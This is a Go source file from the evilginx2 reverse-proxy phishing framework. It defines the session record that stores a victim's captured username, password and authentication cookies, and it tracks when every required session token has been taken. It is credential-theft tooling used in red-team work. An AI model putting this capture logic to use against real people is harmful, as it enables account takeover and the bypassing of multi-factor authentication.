package core

import (
	"time"

	"github.com/kgretzky/evilginx2/database"
)

type Session struct {
	Id             string
	Name           string
	Username       string
	Password       string
	Custom         map[string]string
	Params         map[string]string
	BodyTokens     map[string]string
	HttpTokens     map[string]string
	CookieTokens   map[string]map[string]*database.CookieToken
	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		RemoteAddr:     "",
		UserAgent:      "",
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, secure bool, expires time.Time, maxAge int, sameSite string) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}

	// Calculate expiration
	var expiresUnix int64 = 0
	var expiresHuman string = "Session (browser close)"
	isSession := true

	if !expires.IsZero() {
		expiresUnix = expires.Unix()
		expiresHuman = expires.UTC().Format("2006-01-02 15:04:05 UTC")
		isSession = false
	} else if maxAge > 0 {
		expiresUnix = time.Now().Add(time.Duration(maxAge) * time.Second).Unix()
		expiresHuman = time.Unix(expiresUnix, 0).UTC().Format("2006-01-02 15:04:05 UTC")
		isSession = false
	}

	// Check if domain is host-only (no leading dot)
	hostOnly := len(domain) > 0 && domain[0] != '.'

	if tk, ok := s.CookieTokens[domain][key]; ok {
		tk.Name = key
		tk.Value = value
		tk.Path = path
		tk.HttpOnly = http_only
		tk.Secure = secure
		tk.Expires = expiresUnix
		tk.MaxAge = maxAge
		tk.SameSite = sameSite
		tk.Session = isSession
		tk.HostOnly = hostOnly
		tk.ExpiresHuman = expiresHuman
	} else {
		s.CookieTokens[domain][key] = &database.CookieToken{
			Name:         key,
			Value:        value,
			Path:         path,
			HttpOnly:     http_only,
			Secure:       secure,
			Expires:      expiresUnix,
			MaxAge:       maxAge,
			SameSite:     sameSite,
			Session:      isSession,
			HostOnly:     hostOnly,
			ExpiresHuman: expiresHuman,
		}
	}
}

func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		return true
	}
	return false
}

func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}
